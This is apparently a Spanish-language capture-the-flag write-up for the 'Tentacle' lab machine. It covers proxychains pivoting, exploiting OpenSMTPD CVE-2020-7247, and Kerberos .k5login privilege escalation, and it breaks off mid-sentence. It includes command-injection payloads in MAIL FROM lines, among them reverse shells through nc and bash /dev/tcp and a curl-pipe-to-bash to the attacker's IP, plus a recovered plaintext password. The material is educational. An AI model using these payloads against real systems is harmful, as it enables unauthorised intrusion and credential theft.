9050## Proxies tentacle boxhttp 10. 10. 10. 224  3128 # Proxy squidEntonces ahora que ya tenemos el proxy dentro del archivo de configuraci√≥n, podemos probar mediante nmap a ver si tenemos acceso a alguna de las IPs que encontramos o al localhost, probemos con la IP 10. 91. 243. 31: ‚ù≠ proxychains nmap -sT --min-rate=2000 -Pn -v 10. 197. 243. 31 -oG proxyScan-31 2&gt;/dev/null      Par√°metro   Descripci√≥n         -sT   Para que haga un escaneo de puertos y espere respuesta (SYN/ACK). Ya que -p- no me estaba dando respuesta (aunque hubiera podido usar -sT -p- --open pero pues no se me ocurri√≥ en ese momento.    ‚ù≠ cat proxyScan-31 # Nmap 7. 80 scan initiated Wed Mar 3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oG proxyScan-31 10. 197. 243. 31# Ports scanned: TCP(1000) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 197. 243. 31 () Status: UpHost: 10. 197. 243. 31 () Status: Up# Nmap done at Wed Mar 3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 239. 78 secondsPero pues no obtenemos nada :P Si probamos el escaneo sobre el localhost obtenemos nuevos puertos (: ‚ù≠ cat proxyScan-127 # Nmap 7. 80 scan initiated Wed Mar 3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan-127 127. 0. 0. 1Nmap scan report for localhost (127. 0. 0. 1)Host is up (0. 24s latency). Not shown: 994 closed portsPORT   STATE SERVICE22/tcp  open ssh53/tcp  open domain88/tcp  open kerberos-sec464/tcp open kpasswd5749/tcp open kerberos-adm3128/tcp open squid-httpRead data files from: /usr/bin/. . /share/nmap# Nmap done at Wed Mar 3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 239. 66 seconds      Puerto   Descripci√≥n         464   Kpasswd5 (Kerberos Password Change): Usado para cambiar/configurar passwords en un Controlador de Dominio.        749   kerberos-adm: Administracion de kerberos :P   Pensando un rato, cai en cuenta en realmente el concepto de proxychains (esta explicaci√≥n puede ser larga, o no, pero igual la quiero hacer, se la pueden saltar :P) El concepto de proxy ya lo tenemos claro, entonces simplemente nos estamos apoyando de proxychains para ejecutar comandos‚Ä¶ Peeero si nos enfocamos en su uso real (encadenar proxys) podemos por ejemplo pensar lo siguiente‚Ä¶ Hacemos la petici√≥n hacia la el dominio realcorp. htb mediante el proxy 10. 10. 10. 224:3128, ya que si la hacemos sin √©l, no tenemos respuesta‚Ä¶ Ahora, con proxychains podemos indicarle m√°s proxys para que vaya haciendo una cadena, entonces si le indic√°ramos que queremos hacer una petici√≥n a la IP 10. 197. 243. 31 mediante el proxy 10. 10. 10. 224:3128 pero que a su vez lo encadene con el proxy 127. 0. 0. 1:3128 (localhost), le estar√≠amos indicando que ‚Äúpivotee‚Äù entre proxys para saber si la ip 10. 197. 243. 31 responde a esa cadena de proxies. El pivoting lo muestra Vickie Li en su art√≠culo: (Creo que es una excelente imagen para plasmar lo dicho, gracias @Vickie Li). Entonces probemos la teor√≠a, agreguemos al archivo /etc/proxychains. conf el proxy 127. 0. 0. 1:3128 (que vimos que esta abierto en el anterior escaneo) y empecemos a ejecutar hacia las IPs: ‚ù≠ cat /etc/proxychains. conf . . . # Proxies tentacle boxhttp 10. 10. 10. 224  3128 # squid proxyhttp 127. 0. 0. 1   3128 # localhost proxyEjecutamos inicialmente contra la 10. 197. 243. 31: ‚ù≠ proxychains nmap -sT --min-rate=2000 -Pn -v 10. 197. 243. 31 -oN proxyScan_loc_31 2&gt;/dev/nullNada, no tenemos acceso: ‚ù≠ cat proxyScan_loc_31 # Nmap 7. 80 scan initiated Wed Mar 3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan_loc_31 10. 197. 243. 31Nmap scan report for 10. 197. 243. 31Host is up (0. 36s latency). All 1000 scanned ports on 10. 197. 243. 31 are closedRead data files from: /usr/bin/. . /share/nmap# Nmap done at Wed Mar 3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 371. 44 secondsContra la 10. 197. 243. 77: ‚ù≠ proxychains nmap -sT --min-rate=2000 -Pn -v 10. 197. 243. 77 -oN proxyScan_loc_77 2&gt;/dev/null‚ù≠ cat proxyScan_loc_77 # Nmap 7. 80 scan initiated Wed Mar 3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan_loc_77 10. 197. 243. 77Nmap scan report for 10. 197. 243. 77Host is up (0. 36s latency). Not shown: 994 closed portsPORT   STATE SERVICE22/tcp  open ssh53/tcp  open domain88/tcp  open kerberos-sec464/tcp open kpasswd5749/tcp open kerberos-adm3128/tcp open squid-httpRead data files from: /usr/bin/. . /share/nmap# Nmap done at Wed Mar 3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 367. 15 secondsPerfecto, tenemos acceso ahora a esta IP mediante la cadena de proxies y conseguimos otro proxy para concatenar: ‚ù≠ cat /etc/proxychains. conf . . . # Proxies tentacle boxhttp 10. 10. 10. 224  3128 # squid proxyhttp 127. 0. 0. 1   3128 # localhost proxyhttp 10. 197. 243. 77 3128 # . 77 proxyAhora solo nos quedaria probar ante la IP 10. 197. 243. 31 y ver si tenemos acceso: ‚ù≠ proxychains nmap -sT --min-rate=2000 -Pn -v 10. 197. 243. 31 -oN proxyScan_loc_77_31 2&gt;/dev/nullY tedriamos: ‚ù≠ cat proxyScan_loc_77_31 # Nmap 7. 80 scan initiated Wed Mar 3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan_loc_77_31 10. 197. 243. 31Nmap scan report for 10. 197. 243. 31Host is up (0. 48s latency). Not shown: 993 closed portsPORT   STATE SERVICE22/tcp  open ssh53/tcp  open domain80/tcp  open http88/tcp  open kerberos-sec464/tcp open kpasswd5749/tcp open kerberos-adm3128/tcp open squid-httpRead data files from: /usr/bin/. . /share/nmap# Nmap done at Wed Mar 3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 482. 80 secondsTenemos un servicio HTTP sobre el puerto 80 :O Inspeccionemoslo: ‚ù≠ proxychains nmap -sT -p 80 -sC -sV -Pn -v 10. 197. 243. 31 -oN port80Scan_loc_77_31 2&gt;/dev/null‚ù≠ cat port80Scan_loc_77_31 # Nmap 7. 80 scan initiated Wed Mar 3 25:25:25 2021 as: nmap -sT -p 80 -sC -sV -Pn -v -oN port80Scan_loc_77_31 10. 197. 243. 31Nmap scan report for 10. 197. 243. 31Host is up (0. 47s latency). PORT  STATE SERVICE VERSION80/tcp open http  nginx 1. 14. 1| http-methods: |_ Supported Methods: GET HEAD|_http-server-header: nginx/1. 14. 1|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise LinuxRead data files from: /usr/bin/. . /share/nmapService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Mar 3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 25. 20 secondsBien, intentemos verlo en la web: ‚ù≠ proxychains firefox 10. 197. 243. 31Pero no carga, validemos con cURL: ‚ù≠ proxychains curl http://10. 197. 243. 31&lt;!DOCTYPE html PUBLIC  -//W3C//DTD XHTML 1. 1//EN   http://www. w3. org/TR/xhtml11/DTD/xhtml11. dtd &gt;                &lt;html xmlns= http://www. w3. org/1999/xhtml  xml:lang= en &gt;&lt;head&gt;&lt;title&gt;Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux&lt;/title&gt;&lt;meta http-equiv= Content-Type  content= text/html; charset=UTF-8  /&gt;&lt;style type= text/css &gt;. . . . . . Tenemos respuesta del servidor web‚Ä¶ Estando en este punto algo debemos hacer con la web porque si no ser√≠a un gran (grand√≠simo) rabbit hole‚Ä¶ Probemos a incluir la IP en nuestro archivo /etc/hosts de nuevo a ver si cambia algo la respuesta.  Recuerden cuando obtuvimos esta IP, fue en la enumeraci√≥n del DNS: 10. 197. 243. 31 -&gt; wpad. realcorp. htb‚ù≠ cat /etc/hosts. . . 10. 197. 243. 31 wpad. realcorp. htb. . . Volviendo a intentar‚Ä¶ La web tampoco carga, pero cURL nos responde con un prohibido (nos deniega el acceso): ‚ù≠ proxychains curl wpad. realcorp. htbProxyChains-3. 1 (http://proxychains. sf. net)|S-chain|-&lt;&gt;-10. 10. 10. 224:3128-&lt;&gt;-127. 0. 0. 1:3128-&lt;&gt;-10. 197. 243. 77:3128-&lt;&gt;&lt;&gt;-10. 197. 243. 31:80-&lt;&gt;&lt;&gt;-OK&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor= white &gt;&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;nginx/1. 14. 1&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;Jmmm, intentemos hacer fuzzing a ver si encontramos algo: ‚ù≠ proxychains dirsearch. py -u wpad. realcorp. htb 2&gt;/dev/null. . . [18:31:40] Starting: [18:32:59] 200 - 342B - /wpad. datTask CompletedOpa, tenemos un archivo llamado wpad. dat‚Ä¶ Esto me llamo la atenci√≥n asi que me fui pa la web a indagar un poco sobre el dominio wpad. &lt;etc&gt;. &lt;etc&gt;:  WPAD es un protocolo dise√±ado para hacer una configuracion de proxy facilmente, todo mediante un archivo que es el encargado de hacerlo facil (wpad. dat). Su funcionamiento es simple, cuando alguien se conecta a la red, el dispositivo descargara el archivo y automaticamente configurara todo el proceso para que ese alguien pueda interactuar con la red sin problemas.  ¬øQu√© es el protocolo WPAD?. Perfecto ahora que sabemos que hace ese archivo y porque esta ah√≠, procedamos a descargarlo a ver que contiene: ‚ù≠ proxychains wget http://wpad. realcorp. htb/wpad. dat‚ù≠ cat wpad. dat function FindProxyForURL(url, host) {if (dnsDomainIs(host,  realcorp. htb ))return  DIRECT ;if (isInNet(dnsResolve(host),  10. 197. 243. 0 ,  255. 255. 255. 0 ))return  DIRECT ; if (isInNet(dnsResolve(host),  10. 241. 251. 0 ,  255. 255. 255. 0 ))return  DIRECT ; return  PROXY proxy. realcorp. htb:3128 ;}Bien, vemos como asigna las direcciones IP:  Un ID 10. 197. 243. 0 (que con este rango de IPs ya jugamos).  Un nuevo ID 10. 241. 251. 0 del cual podemos probar a ver que IPs est√°n activas (Entre el rango de . 1 a . 254). Hag√°mosle el escaneo para saber que IPs nos reporta como activas: ‚ù≠ proxychains nmap -v --min-rate=2000 10. 241. 251. 0/24 -oN allIP 2&gt;/dev/nullEl reporte es gigante, podemos extraer info esclarecedora asi: ‚ù≠ cat allIP | grep  host down Nmap scan report for 10. 241. 251. 4 [host down]. . . ‚ù≠ cat allIP | grep  host down  | wc -l26Hay 26 hosts que al parecer est√°n inactivos. Los que no tienen ese estado los filtra como Up: ‚ù≠ cat allIP | grep  up  -A 1 -B 1Nmap scan report for 10. 241. 251. 6Host is up (0. 00015s latency). All 1000 scanned ports on 10. 241. 251. 6 are filtered. . . Entonces, extraigamos las IPs y guard√©moslas en un archivo para hacerle un escaneo de puertos r√°pido, aprovechemos que en la l√≠nea que contiene el filtered aparecen:  filtered nos indica que nmap no puede saber con certeza esta abierto. Tipos de estados - nmap. ‚ù≠ cat allIP | grep  filtered All 1000 scanned ports on 10. 241. 251. 0 are filteredAll 1000 scanned ports on 10. 241. 251. 1 are filteredAll 1000 scanned ports on 10. 241. 251. 2 are filtered. . . ‚ù≠ cat allIP | grep  filtered  | cut -d ' ' -f 6 &gt; IPtoSCAN‚ù≠ cat IPtoSCAN 10. 241. 251. 010. 241. 251. 110. 241. 251. 210. 241. 251. 3. . . Despues de un sondeo y probar cosas, el que mejor se comport√≥ fue este escaneo: ‚ù≠ proxychains nmap -sT --top-ports=100 --open --host-timeout 2m --min-rate=2000 -Pn -v -iL IPtoSCAN -oN proxyNEW_ports 2&gt;/dev/null      Par√°metro   Descripci√≥n         ‚Äìtop-ports   Escanea los X puertos m√°s populares (100 en este caso).        ‚Äìopen   Solo los puertos que est√©n abiertos.        ‚Äìhost-timeout   Si ha pasado X tiempo y el escaneo no ha acabado, cancela la conexi√≥n con esa direcci√≥n.        ‚ÄìiL   Toma un archivo donde est√©n direcciones IP.    Al final en el archivo proxyNEW_ports se guard√≥ muuuuuuuuuuucho, pero todas las IPs fueron descartadas por timeout‚Ä¶ Peeero si nos damos cuenta (o filtramos con grep) en el verbose, tenemos un puerto sobre la ip 10. 241. 251. 113: . . . 10. 241. 251. 134 timed out during Connect Scan (7 hosts left)Discovered open port 25/tcp on 10. 241. 251. 113. . . Perfectoooooooooooooo, ahora volvamos a validar hacia ese host: ‚ù≠ proxychains nmap -sT --min-rate=2000 -Pn -v 10. 241. 251. 113 -oN proxyNEW-113 2&gt;/dev/null‚ù≠ cat proxyNEW-113 # Nmap 7. 80 scan initiated Thu Mar 4 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyNEW-113 10. 241. 251. 113Nmap scan report for 10. 241. 251. 113Host is up (0. 50s latency). Not shown: 999 closed portsPORT  STATE SERVICE25/tcp open smtpRead data files from: /usr/bin/. . /share/nmap# Nmap done at Thu Mar 4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 489. 74 secondsBien, hag√°mosle el escaneo de scripts y versiones para ver quien esta manteniendo ese puerto SMTP: ‚ù≠ proxychains nmap -p 25 -sC -sV -Pn -v 10. 241. 251. 113 -oN proxyNEW-113_port25 2&gt;/dev/null‚ù≠ cat proxyNEW-113_port25 # Nmap 7. 80 scan initiated Thu Mar 4 25:25:25 2021 as: nmap -p 25 -sC -sV -Pn -v -oN proxyNEW-113_port25 10. 241. 251. 113Nmap scan report for 10. 241. 251. 113Host is up (0. 47s latency). PORT  STATE SERVICE VERSION25/tcp open smtp  OpenSMTPD| smtp-commands: smtp. realcorp. htb Hello nmap. scanme. org [10. 241. 251. 1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, |_ 2. 0. 0 This is OpenSMTPD 2. 0. 0 To report bugs in the implementation, please contact bugs@openbsd. org 2. 0. 0 with full details 2. 0. 0 End of HELP info Service Info: Host: smtp. realcorp. htbRead data files from: /usr/bin/. . /share/nmapService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Thu Mar 4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 12. 14 secondsVale entonces tenemos:       Puerto   Servicio   Versi√≥n         25   SMTP   OpenSMTPD 2. 0. 0    Domain: smtp. realcorp. htb.  OpenSMTPD is the mail transfer agent (e-mail server) of the OpenBSD operating system and is also available as a ‚Äòportable‚Äô version for other UNIX systems, such as GNU/Linux. RangeForce. com - CVE-2020-7247. Investigando en internet sobre esa versi√≥n, encontramos una vulnerabilidad llamativa que nos permite ejecutar comandos en el servidor que contenga el servicio SMTP como root:  CVE-2020-7247 - cve. mitre. org.  The vulnerability is caused by improper validation of the e-mail sender address. The sender address is included in the command line when the mailbox delivery program is called; if the sender address includes shell meta-characters these will be interpreted by the shell, allowing the execution of commands on the server. RangeForce. com - CVE-2020-7247. Nice, suena lindo lindo. Pero antes de probar, recordemos que al inicio encontramos un correo del administrador del sistema: j. nakazawa@realcorp. htb. Record√© una forma que ippsec ense√±o para comprobar si un usuario es v√°lido en el servicio SMTP, asi que hag√°mosla para asegurarnos que ese correo exista:  Validando usuarios manualmente en el servidor SMTP - ippsec videoHacemos una trama normal, solo que en el receptor ponemos el usuario que creemos v√°lido y otro que probablemente no, la respuesta es la clave: Perfecto, entonces sabemos que es una direcci√≥n de correo v√°lida, ahora si exploremos la explotaci√≥n‚Ä¶  CVE-2020-7247 Privileged Remote Code Execution / Command Injection.  OpenSMTPD Privilege Escalation Code Execution.  OpenSMTPD Remote Vulnerability.  Exploit - github. com/superzerosec/CVE-2020-7247. (El exploit de github. com/superzerosec es funcional, pero en mis primeros intentos no logre que funcionara (por una tontada que veremos adelante y que se me olvido probar) asi que lo deje a un lado y empece a buscar otras formas). En el primer recurso nos muestra una forma sencilla de explotar la vulnerabilidad, en el que le agregar√≠amos al remitente el c√≥digo que queramos ejecutar:  Ejemplo del articulo:    MAIL FROM:&lt;; killall puppies ; echo &gt;   Nuestro ejemplo:    MAIL FROM:&lt;;ping -c 1 10. 10. 14. 138;sh&gt;  Lo que quiero lograr es ver si la m√°quina nos hace una petici√≥n ICMP, asi que pong√°monos en escucha por la interfaz donde esta nuestra IP (en este caso la de HTB, tun0) y filtremos por las capturas ICMP: ‚ù≠ tshark -i tun0 -Y  icmp  2&gt;/dev/nullY ejecutamos: Perfecto, tenemos ejecuci√≥n remota de comandos, intentemos ejecutarnos una Reverse Shell (JA)‚Ä¶ Intentando cositas como:  MAIL FROM:&lt;;ping -c 1 10. 10. 14. 138;id | nc 10. 10. 14. 138 4433;&gt;    Obtenemos la peticion ICMP pero nada en nuestro listener nc. MAIL FROM:&lt;;ping -c 1 10. 10. 14. 138;bash -i &gt;&amp; /dev/tcp/10. 10. 14. 138/4433 0&gt;&amp;1;&gt;Nos da un error de que no es valido el caracter &amp;. MAIL FROM:&lt;;ping -c 1 10. 10. 14. 138;curl http://10. 10. 14. 138/revsh. sh | bash;&gt;No obtenemos ninguna peticion en nuestro servidor.  Y bueno otras pruebas, nada‚Ä¶ Despues de varios intentos fallidos, volvi a la web y encontre uno de los recursos que referencie antes, en el que nos indican el por que no estamos obteniendo la Shell:  OpenSMTPD Privilege Escalation Code Execution. Y m√°s abajo nos indica:  ‚Äúwe cannot use the | and &gt; characters‚Äù Ya que transforma esos caracteres en :‚Ä¶ Peeeeeeeeeeero, en el mismo art√≠culo, nos da un PoC de como se har√≠a para a√∫n asi bypassear esto, emul√©moslo pero para conseguir una Shell: Nos ponemos en escucha: ‚ù≠ nc -lvp 4433listening on [any] 4433 . . . Y ejecutamos:  Perfectoooooooooooooooooooooooooooooooooooooooo, estamos dentrooooo. Ufff que locura eh! (El tema es que en el servidor no est√°n instalados ni nc ni curl, por eso no pod√≠amos ejecutarlos antes. El exploit que hab√≠amos encontrado en github estaba usando nc, no se me paso por la mente cambiarlo para conseguir una Shell con bash /dev/tcp. . . , por eso tampoco funcionada. Pero cambiando esa l√≠nea por bash. . . tambi√©n obtenemos una Shell :P Hubiera sido m√°s directo pero nos sirvi√≥ para entender mejor la vulnerabilidad) Bueno, ahora a enumerar‚Ä¶ (Antes, hacemos tratamiento de la TTY, s4vitar nos lo explica). ‚Ä¶ Explotaci√≥n #: En el directorio /home nos encontramos el usuario j. nakazawa, el cual tiene un archivo interesante: root@smtp:/home/j. nakazawa$ cat . msmtprc # Set default values for all following accounts. defaultsauth      ontls      ontls_trust_file /etc/ssl/certs/ca-certificates. crtlogfile    /dev/null# RealCorp Mailaccount    realcorphost      127. 0. 0. 1port      587from      j. nakazawa@realcorp. htbuser      j. nakazawapassword    sJB}RM&gt;6Z~64_tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60# Set a default accountaccount default : realcorpSeg√∫n nuestra b√∫squeda, se trata de un archivo de configuraci√≥n del servicio msmtp (Cliente SMTP) el cual contiene una contrase√±a y un usuario potencial, pero en el servicio mail‚Ä¶ Si intentamos rehusar esa contrase√±a hacia la m√°quina no obtenemos nada‚Ä¶ Podemos validar la veracidad de esa contrase√±a en el servicio SMTP con la ayuda de esta gu√≠a](https://wiki. archlinux. org/index. php/OpenSMTPD#Manual_Submission_port_authentication): # Primero la pasamos a base64root@smtp:/home/j. nakazawa$ printf '\0j. nakazawa\0sJB}RM&gt;6Z~64_' | base64AGoubmFrYXphd2EAc0pCfVJNPjZafjY0Xw==# Ahora nos conectamos al servicio que esta corriendo en el puerto 587root@smtp:/home/j. nakazawa$ openssl s_client -host 127. 0. 0. 1 -port 587 -starttls smtpCONNECTED(00000003). . . ---250 HELPSaludamos al servicio SMTP y nos autenticamos: 250 HELPHELO lanz. corp250 smtp. realcorp. htb Hello lanz. corp [127. 0. 0. 1], pleased to meet youAUTH PLAIN # Escribimos esto334 AGoubmFrYXphd2EAc0pCfVJNPjZafjY0Xw==   # Colocamos la cadena en base64235 2. 0. 0 Authentication succeededPero no podemos ver nada con esto‚Ä¶ De nuevo estuve buscando formas pero no entend√≠a que hacer, asi que necesite algo de ayuda. Me indicaron que me enfocara en el servicio kerberos (que hab√≠amos encontrado en el escaneo inicial) y que sobre todo estuviera atento a los hosts :P Bueno bueno bueeeno‚Ä¶  Kerberos: Protocolo de autenticaci√≥n. Su finalidad es proveer mayor seguridad, ya que la persona que quiera ingresar al sistema, primero debera hacer una peticion al KDC (Centro de distribucion de llaves) pidiendo un ticket (Ticket-Granting Ticket), el ticket sera encriptado usando la password como llave y nos devolvera el ticket con un tiempo de expiracion para iniciar sesi√≥n.  Breve introducci√≥n a Kerberos. Claramente su uso es m√°s profundo, pero en t√©rminos generales podemos tener esa idea‚Ä¶  Imagen tomada de varonis. com/kerberos-authentication-explained. Algunos recursos que est√°n buenos pa echarles el ojo:  Como funciona Kerberos - ES.  Kerberos authentication. Bueno, ahora que tenemos la idea, veamos que tenemos para jugar con kerberos:  Tenemos a kerberos corriendo sobre el puerto 88 del host 10. 10. 10. 224.  El dominio del kerberos esta sobre realcorp. htb (si recordamos en el inicio cuando revisamos el puerto desde la web, ah√≠ aparec√≠a).  Contamos con unas credenciales que posiblemente se est√©n reutilizando: j. nakazawa -&gt; sJB}RM&gt;6Z~64_. Buscando maneras de logearnos al servicio, encontramos este recurso:  Service Kerberos - Ubuntu. Nos indica lo que debemos descargar: apt install krb5-user sssd-krb5En el proceso nos salta una ventana (supongo que es esta, ya que escrib√≠ esto despues de la descarga :P) en la que debemos indicarle el dominio y servidor kerberos: Dominio (reino, esta explicado en la misma imagen e. e) Servers (ac√° escribimos el servidor en el que esta montado kerberos)   Para volver a obtener la configuraci√≥n (por si la embarramos o cualquier otra cosa) escribimos: sudo dpkg-reconfigure krb5-config. Asi mismo, el archivo en que se estan guardando estas configuraciones esta en la ruta: /etc/krb5. conf. Listos, ahora debemos fijarnos en nuestro archivo /etc/hosts para que el servidor kerberos (10. 10. 10. 224:88) apunte correctamente al dominio al que queremos obtener una sesi√≥n:  Si recordamos el error que nos salio cuando enumeramos el proxy en la web. Vimos que nos respondia con el dominio del cual provenia esa respuesta, osea el dominio al que necesitamos ir: ‚ù≠ cat /etc/hosts. . . 10. 10. 10. 224  srv01. realcorp. htb. . . Ahora s√≠, juguemos con kerberos. Para generar el ticket debemos usar kinit: ‚ù≠ kinit j. nakazawa@realcorp. htbkinit: Cannot find KDC for realm  realcorp. htb  while getting initial credentials‚ù≠ kinit j. nakazawa@REALCORP. HTBPassword for j. nakazawa@REALCORP. HTB:Para validar que se nos gener√≥ el ticket, podemos listarlos: ‚ù≠ klistTicket cache: FILE:/tmp/krb5cc_0Default principal: j. nakazawa@REALCORP. HTBValid starting   Expires      Service principal07/03/21 21:00:30 08/03/21 21:00:30 krbtgt/REALCORP. HTB@REALCORP. HTBPerfecto, ahora validemos contra el servicio SSH: BIEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEN, estamos dentro ahora de srv01. realcorp. htb y tenemos acceso a la flag user. txt :‚Äô) Que locura, que vaina tan loca, lindo camino. Y bueno, ahora nos queda la mejor parte :P ‚Ä¶ Escalada de privilegios #: Si validamos usuarios y archivos relacionados encontramos esto: [j. nakazawa@srv01 ~]$ ls /home/admin j. nakazawa[j. nakazawa@srv01 ~]$ find / -group admin 2&gt;/dev/null/etc/krb5. keytab/usr/local/bin/log_backup. sh/home/adminVemos un archivo interesante, si nos fijamos en su contenido nos damos cuenta de algo: [j. nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup. sh#!/bin/bash/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/cd /home/admin/usr/bin/tar czf squid_logs. tar. gz. `/usr/bin/date +%F-%H%M%S` access. log cache. log/usr/bin/rm -f access. log cache. logEsta haciendo una sincronizaci√≥n (backup) total del directorio /var/log/squid/* hacia el directorio /home/admin y despues simplemente los comprime con fecha y hora‚Ä¶ Si intentamos ver el contenido de /var/log/squid/ no podemos: [j. nakazawa@srv01 ~]$ ls -la /var/log/squid/ls: no se puede abrir el directorio '/var/log/squid/': Permission denied[j. nakazawa@srv01 ~]$ ls -la /var/log. . . drwx-wx---.  2 admin squid   41 mar 8 16:03 squid. . . Validando en que grupo estamos asignados: [j. nakazawa@srv01 ~]$ iduid=1000(j. nakazawa) gid=1000(j. nakazawa) grupos=1000(j. nakazawa),23(squid),100(users) contexto=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0. c1023Tenemos asignado el grupo squid, intentemos escribir cualquier cosa sobre esa ruta: [j. nakazawa@srv01 ~]$ echo  holas  &gt; /var/log/squid/holas[j. nakazawa@srv01 ~]$ ls -la /var/log/squid/holas-rw-rw-r--. 1 j. nakazawa j. nakazawa 6 mar 8 16:17 /var/log/squid/holas[j. nakazawa@srv01 ~]$ cat /var/log/squid/holasholasBien, podemos escribir, ahora sabemos que ese archivo  /holas  ser√° enviado al directorio /home/admin‚Ä¶ Pero ¬øqu√© podemos mover a su directorio para poder obtener su sesi√≥n?‚Ä¶ (Pues a√∫n no lo s√© :P) Y s√≠, estuve un tiempo pensando, pero no se me ocurri√≥ nada, asi que busque ayuda. La cual me indico: ‚Äúno te olvides de kerberos‚Äú‚Ä¶ Intentando desencriptar el mensaje, encontr√© este hilo hablando sobre . k5login, adem√°s encontr√© esta definici√≥n:  ‚ÄúThe . k5login file, which resides in a user‚Äôs home directory, contains a list of the Kerberos principals. Anyone with valid tickets for a principal in the file is allowed host access with the UID of the user in whose home directory the file resides. One common use is to place a . k5login file in root‚Äôs home directory, thereby granting system administrators remote root access to the host via Kerberos. ‚Äù web. mit. edu/. k5login. Perfecto, como nos indica, cualquiera con el archivo . k5login en su directorio /home permitir√° obtener una sesi√≥n como √©l (UID). Simplemente el archivo . k5login debe contener un usuario v√°lido en el dominio kerberos, tenemos a j. nakazawa@REALCORP. HTB, asi que generemos el archivo y mov√°moslo‚Ä¶  Suppose the user alice had a . k5login file in her home directory containing just the following line:    bob@FOOBAR. ORGThis would allow bob to use Kerberos network applications, such as ssh, to access alice‚Äòs account, using bob‚Äòs Kerberos tickets.   Definici√≥n de . k5login que sirvi√≥ como referencia. Creemos el archivo: [j. nakazawa@srv01 ~]$ echo  j. nakazawa@REALCORP. HTB  &gt; . k5login[j. nakazawa@srv01 ~]$ cat . k5login j. nakazawa@REALCORP. HTBAhora lo movemos e intentamos conectarnos como admin por SSH, no sabemos cada cuanto se ejecute el script, asi que vamos validando‚Ä¶ [j. nakazawa@srv01 ~]$ mv . k5login /var/log/squid/Yyy: ‚ù≠ ssh admin@10. 10. 10. 224admin@10. 10. 10. 224's password:‚ù≠ ssh admin@10. 10. 10. 224admin@10. 10. 10. 224's password:‚ù≠ ssh admin@10. 10. 10. 224Activate the web console with: systemctl enable --now cockpit. socketLast login: Mon Mar 8 16:42:02 2021[admin@srv01 ~]$Perfecto, peeeeeeeeeeeerfecto. Enumerando al usuario admin encontramos un archivo interesante: [admin@srv01 ~]$ find / -group admin 2&gt;/dev/null | grep -vE  sys|proc|run /etc/krb5. keytab/usr/local/bin/log_backup. sh/home/admin/home/admin/. sshValid√°ndolo: Jmm, veamos que tipo de archivo es: [admin@srv01 ~]$ file /etc/krb5. keytab/etc/krb5. keytab: Kerberos Keytab file, realm=REALCORP. HTB, principal=host/srv01. realcorp. htb, type=1, date=Tue Dec 8 22:15:30 2020, kvno=2Parece relevante, investigando sobre √©l, encontramos:  ‚ÄúLa clave de servicio es utilizada por un servicio para autenticarse a s√≠ misma en el KDC, y solo es conocida por Kerberos y el servicio. ‚Äù‚ÄúUn archivo keytab es an√°logo a la contrase√±a de un usuario. De la misma manera que es importante que los usuarios protejan sus contrase√±as, es importante que los servidores de aplicaciones protejan sus archivos keytab. Siempre debe guardar los archivos keytab en un disco local y permitir su lectura s√≥lo al usuario root. ‚Äù    docs. oracle. com/keytab.   M√°s info sobre keytab file. Uff pues si tiene relevancia, jugando con Google, encontramos como listar las llaves guardadas en cache del archivo . keytab:  PayloadAllTheThings/ActiveDirectory/keytab. [admin@srv01 ~]$ klist -k /etc/krb5. keytabKeytab name: FILE:/etc/krb5. keytabKVNO Principal---- --------------------------------------------------------------------------2 host/srv01. realcorp. htb@REALCORP. HTB2 host/srv01. realcorp. htb@REALCORP. HTB2 host/srv01. realcorp. htb@REALCORP. HTB2 host/srv01. realcorp. htb@REALCORP. HTB2 host/srv01. realcorp. htb@REALCORP. HTB2 kadmin/changepw@REALCORP. HTB2 kadmin/changepw@REALCORP. HTB2 kadmin/changepw@REALCORP. HTB2 kadmin/changepw@REALCORP. HTB2 kadmin/changepw@REALCORP. HTB2 kadmin/admin@REALCORP. HTB2 kadmin/admin@REALCORP. HTB2 kadmin/admin@REALCORP. HTB2 kadmin/admin@REALCORP. HTB2 kadmin/admin@REALCORP. HTBVale vale valeee‚Ä¶ Despues de enumerar los comandos que podemos ejecutar mediante kerberos: [admin@srv01 ~]$ kk5srvutil    kadmin. local  kbdrate     kdestroy    kexec      klist      kpasswd     kpropd     ksu       kvm_statkadmin     kbdinfo     kbxutil     kdumpctl    kill      kmod      kpatch     kproplog    kswitch     kvnokadmind     kbd_mode    kdb5_util    kernel-install kinit      kpartx     kprop      krb5kdc     ktutilDos me llamaron la atenci√≥n de primeras, ksu y kadmin. Buscando en internet sus funcionalidades, el m√°s relevante del cual empezaremos a desplegarnos ser√° ksu. Es una versi√≥n ‚Äúkerberized‚Äù del programa su en linux. Su ‚Äúmisi√≥n‚Äù es la de autenticar y autorizar. Todo esto permiti√©ndoselo (resolviendo) al ‚Äútarget principal name‚Äù (como el usuario principal).  Docs Kerberos - User commands (ksu). Entonces, tenemos la 